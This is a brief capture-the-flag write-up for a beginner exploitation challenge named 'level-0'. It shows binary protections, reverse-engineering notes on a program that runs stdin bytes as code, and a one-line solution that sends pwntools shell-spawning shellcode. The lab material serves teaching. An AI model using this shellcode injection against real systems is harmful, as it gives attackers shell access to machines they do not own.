
## x64 calling convention
RDI, RSI, RDX, RCX, R8, R9

## intro
```
>>> ELF("level-0")
[*] '/vagrant/level-0/level-0'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Reverse engineering of code
```
# sym.init_chal() - 0x7f0
# 0x1e, 30 seconds
unsigned int alarm(unsigned int seconds);
DESCRIPTION - SIGALRM signal to be delivered to the calling process in seconds seconds.

# setvbuf(stdin, 0, 2 /* line buffered */, 0?, 0?)

# main(argc, argv) - 0x690
init_chal()

# 0111
char *buf = mmap(...)
read(0 /*stdin*/, buf, 0x1000) 
```
Self-explanatory.  Program accepts `0x1000` bytes over stdin,
puts them in an executable buffer and then jumps to that buffer.

## Solution
Send `asm(shellcraft.amd64.sh())` into stdin of the program.
